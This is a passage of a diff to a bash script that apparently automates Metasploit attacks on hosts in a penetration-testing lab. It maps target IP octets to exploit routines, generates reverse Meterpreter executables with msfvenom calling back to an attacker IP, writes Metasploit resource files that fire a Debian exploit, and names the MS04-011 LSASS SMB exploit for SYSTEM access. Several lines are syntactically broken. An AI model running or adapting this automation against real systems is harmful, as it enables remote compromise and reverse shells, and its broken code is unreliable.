         checkthebrakesTop;
         echo -e "\t[*] Producing file: $webdir/cory/evil$toctet.exe "
         checkthebrakesBot;
-        $msfv -p $pay LHOST=$AttackerIP LPORT=$lp X > $webdir/cory/evil$toctet.exe
+        $msfv -p $winmetrev LHOST=$AttackerIP LPORT=$lp X > $webdir/cory/evil$toctet.exe
     fi;
   }
   coryevil;
@@ -2332,18 +2634,18 @@ cory() {
 debian() {
   makeDebianRC() {
     # start debian resource file structure
-    if [ ! -f $msfs/debian$toctet.rc ];
+    if [ ! -f $msfs/debian$toctet$loctet.rc ];
       then 
         checkthebrakesTop;
-        echo -e "\t[*] Producing file: $msfs/debian$toctet.rc "
+        echo -e "\t[*] Producing file: $msfs/debian$toctet$loctet.rc "
         checkthebrakesBot;
-        echo -e "use $debianExploit" > $msfs/debian$toctet.rc
-        echo -e "set RHOST $uip" >> $msfs/debian$toctet.rc
-        echo -e "set target 2" >> $msfs/debian$toctet.rc
-        echo -e "set $DPH" >> $msfs/debian$toctet.rc
-        echo -e "setRPORT $lp" >> $msfs/debian$toctet.rc
-        echo -e "exploit" >> $msfs/debian$toctet.rc
-        echo -e "exit" >> $msfs/debian$toctet.rc
+        echo -e "use $debianExploit" > $msfs/debian$toctet$loctet.rc
+        echo -e "set RHOST $uip" >> $msfs/debian$toctet$loctet.rc
+        echo -e "set target 2" >> $msfs/debian$toctet$loctet.rc
+        echo -e "set $DPH" >> $msfs/debian$toctet$loctet.rc
+        echo -e "setRPORT $lp" >> $msfs/debian$toctet$loctet.rc
+        echo -e "exploit" >> $msfs/debian$toctet$loctet.rc
+        echo -e "exit" >> $msfs/debian$toctet$loctet.rc
     fi;
   }
   makeDebianRC;
@@ -2395,300 +2697,3 @@ Sean() {
   echo -e "\t[*] Finished Exploitation of Sean "
   checkthebrakesBot;
 }
-#
-################################################################################
-#~~~~~~~~~~~~~~~~~~~~~> POP-A-BOX & EXPLOITATION SECTION <~~~~~~~~~~~~~~~~~~~~~#
-################################################################################
-#
-# start POP-A-BOX
-# Checking id used spawned terminals and killing them as needed!
-POPABOX() {
-  if [ $loctet == "201" ];
-    then
-      #Choose Alice
-      alicedescription() {
-        checkthebrakesTop;
-        echo -e "\t[*] Alice Exploitation is described as follows: "
-        echo -e "\t[-] Description:" 
-        echo -e "\t      Alice has an unpatched vulnerability on her machine"
-        echo -e "\t      This vulnerability has PoC code located in metasploit"
-        echo -e "\t      Attacking the exposed SMB port, LSASS can be overflown"
-        echo -e "\t[!] Use Metasploit:"
-        echo -e "\t      use exploit/windows/smb/ms04_011_lsass "
-        echo -e "\t[!] This exploit will give System/NT_Auth access to the host "
-        checkthebrakesBot;
-      }
-      (alicedescription);
-      (AliceInWonderland)
-    elif [ $loctet == "202" ];
-      then
-        # Choose GHOST
-        (GhostAttack)
-        checkthebrakesTop;
-        echo -e "\t[*] Ghost Exploitation is multi-phased as described below: "
-        echo -e "\t\t[-] Description:"
-        echo -e "\t\t[-] Stage(1): "
-        echo -e "\t\t[-] Stage(2): "
-        echo -e "\t\t[-] Stage(3): "
-        checkthebrakesBot;
-    elif [ $loctet == "203" ]; 
-      then
-        # Choose BOB 1
-        (killBoB)
-    elif [ $loctet == "204" ]; 
-      then
-        # Choose BOB 2
-        (killBoB)
-    elif [ $loctet == "205" ]; 
-      then
-        # Choose ORACLE 1
-        (talkTotheOracle1)
-    elif [ $loctet == "206" ]; 
-      then
-        # Choose ORACLE 2
-        (talkTotheOracle2)
-    elif [ $loctet == "207" ]; 
-      then
-        # Choose ORACLE 2
-        (PedroSanchez)
-    elif [ $loctet == "208" ];
-      then
-        # Choose Phoenix
-        (RiseofthePhoenix)
-    elif [ $loctet == "209" ];
-      then
-        # Choose Cacti
-        (CactiSpine)
-    elif [ $loctet == "211" ];
-      then
-        # Choose Trix
-        (SillyRabbit)
-    elif [ $loctet == "213" ];
-      then
-        # Choose MSFPRO 1 
-        (MSFPRO)
-    elif [ $loctet == "214" ];
-      then
-        # Choose MSFPRO 2
-        (MSFPRO)
-    elif [ $loctet == "215" ];
-      then
-        # Choose RedHat
-        (RedHatHaXoR)
-    elif [ $loctet == "217" ];
-      then
-        # Choose RedHat9
-        (RedHatHaXin9)
-    elif [ $loctet == "220" ];
-      then
-        # Choose Master
-        (MasterAttack)
-    elif [ $loctet == "221" ];
-      then
-        # Choose Slave
-        (SexSlave)
-    elif [ $loctet == "222" ];
-      then
-        # Choose MailMan
-        (MailMan)
-    elif [ $loctet == "223" ];
-      then
-        # Choose Jeff
-        (djJazzy)
-    elif [ $loctet == "224" ];
-      then
-        # Choose CSCart
-        (cscartfsk)
-    elif [ $loctet == "226" ];
-      then
-        # Choose IT Joe
-        (ITJoe)
-    elif [ $loctet == "227" ];
-      then
-        # Choose WebSQL
-        (WebSQL)
-    elif [ $loctet == "229" ];
-      then
-        # Choose ThinMail
-        (ThinMail)
-    elif [ $loctet == "231" ];
-      then
-        # Choose Ralph
-        (Ralph)
-    elif [ $loctet == "234" ];
-      then
-        # Choose Gentoo
-        (Gentoo)
-    elif [ $loctet == "235" ];
-      then
-        # Choose Pain
-        (Pain)
-    elif [ $loctet == "236" ];
-      then
-        # Choose Suffer
-        (sufferMore)
-    elif [ $loctet == "241" ];
-      then
-        # Choose FC4ME
-        (fc4me)
-    elif [ $loctet == "242" ];
-      then
-        # Choose FC4ME
-        (fc4me)
-    elif [ $loctet == "245" ];
-      then
-        # Choose HelpDesk
-        (helpdesk)
-    elif [ $loctet == "247" ];
-      then
-        # Choose Cory
-        (cory)
-    elif [ $loctet == "249" ];
-      then
-        # Choose Debian
-        (debian)
-    elif [ $loctet == "251" ];
-      then
-        # Choose Sean
-        (Sean)
-  fi;
-}
-#if [ `echo $uip | cut -d"." -f4` == "203" ]; then
-# echo -e "\n\n[*] Do you wish to kill the spawned terminals for this hack on "$uip
-# read death
-# if [ $rev == "Y" && $rev == "y" ];then
-#  ps -A xf | grep bobmh.rc | grep "ruby" | cut -d " " -f1 | xargs kill -9
-# else
-#  echo -e "\n\n[*] Leaving spawned terminals open for "$uip 
-# fi
-#fi
-
-#if [ `echo $uip | cut -d"." -f4` == "204" ]; then
-# echo -e "\n\n[*] Do you wish to kill the spawned terminals for this hack on "$uip
-# read death
-# if [ $rev == "Y" ];then
-#  ps -A xf | grep bobmh2.rc | grep "ruby" | cut -d " " -f1 | xargs kill -9
-# else
-#  echo -e "\n\n[*] Leaving spawned terminals open for "$uip 
-# fi
-#fi
-#
-################################################################################
-#~~~~~~~~~~~~~~~~~~~~~> REV-A-BOX & EXPLOITATION SECTION <~~~~~~~~~~~~~~~~~~~~~#
-################################################################################
-#
-# start REV-A-BOX
-doarevwget() {
-  if [ $toctet == "11" ];
-    then
-      vmlocation="vm10";
-      revip="10.10.10.7"
-    elif [ $toctet == "13" ];
-      then
-        vmlocation="vm12";
-        revip="10.10.11.7"
-    elif [ $toctet == "15" ];
-      then
-        vmlocation="vm21";
-        revip="10.10.14.7"
-  fi;
-  wg="wget ";
-  nocheck="--no-check-certificate ";
-  post="--post-data=\"";
-  action="awlAction=login&";
-  username="awlUserName=OSIDNUM&";
-  passwd="awlPasswd=PASSWORD&";
-  ipaddr="ip=$revuip&";
-  type="type=servers&";
-  ipaddr="ip=$revuip&";
-  strike="strike=0&";
-  location="location=$vmlocation\" ";
-  serverurl="https://$revip/functions/revert_machine_admin.php";
-  revcmd="$wg$nocheck$post$action$username$passwd$ipaddr$type$ipaddr$strike$location$serverurl"
-  cleanup() {
-    rm ./revert_machine_admin.php* 2>/dev/null;
-  }
-  (`$revcmd`);
-  (cleanup);
-}
-# reverting panel
-REVABOC() {
-  takerevin() {
-    if [ $select == "revert" ];
-      then
-        #echo -e "\n\n[*] Do you wish to revert the machine "$uip
-        #echo -e "\n\t\t[*] Please enter (Y) for Yes or (ANYTHING) else for No\n"
-        checkthebrakesTop;
-        echo -e "\n\n[*] Please enter an IP address of the machine you wish to revert\n\t"
-        checkthebrakesBot;
-        read revuip
-    fi;
-  }
-  takerevin;
-  doublecheckrev() {
-    checkthebrakesTop'
-    echo -e "\n\n\t[*] Do you wish to revert the machine "$uip
-    echo -e "\n\t\t[*] Please enter (Y) for Yes or (ANYTHING) else for No\n"
-    read doublerev
-    checkthebrakesBot;
-  }
-  doublecheckrev;
-    if [ $doublerev == "Y" ];
-      then
-        doarevwget;
-      else
-        takerevin;
-    fi;
-  }
-  doublecheckrev()
-  # end revert
-}
-#
-################################################################################
-#~~~~~~~~~~~~~~~~~~~> GAME OF LABS & EXPLOITATION SECTION <~~~~~~~~~~~~~~~~~~~~#
-################################################################################
-#
-# start POP-A-BOX
-# Checking id used spawned terminals and killing them as needed!
-GameOfLABS() {
-  # Read userinput from STDIN
-  # Take IP as variable
-  # Use against a list of known targets....
-  # Kick off functions as needed per host
-  checkthebrakesTop;
-  echo -e "[*] Thank you for playing the Game of LABS, "
-  echo -e "\t[?] What do you want to do? - Answers are: 'pop XOR revert' choose wisely\n"
-  takeIP() {
-    read selection;
-    if [ "$selection" == "pop" ];
-      then
-        echo -e "\n[*] Please enter an IP address to Exploit ...\n"
-        read uip
-        echo;
-        checkthebrakesNo;
-        chopandskew() {
-          loctet=`echo $uip | cut -d"." -f4`;
-          toctet=`echo $uip | cut -d"." -f3`;
-        }
-        chopandskew;
-    fi;
-  }
-  takeIP;
-  makeuservar() {
-    # AttackerIP Configuration
-    if [ "$toctet" == "11" ];
-      then
-        AttackerIP=$lh1
-      elif [ "$toctet" == "13" ];
-        then
-          AttackerIP=$lh2
-      elif [ "$toctet" == "15" ];
-        then
-          AttackerIP=$lh3
-    fi;
-  }
-  (takeIP);
-  (makeuservar);
-  (POPABOX);
-}
-(GameOfLABS);
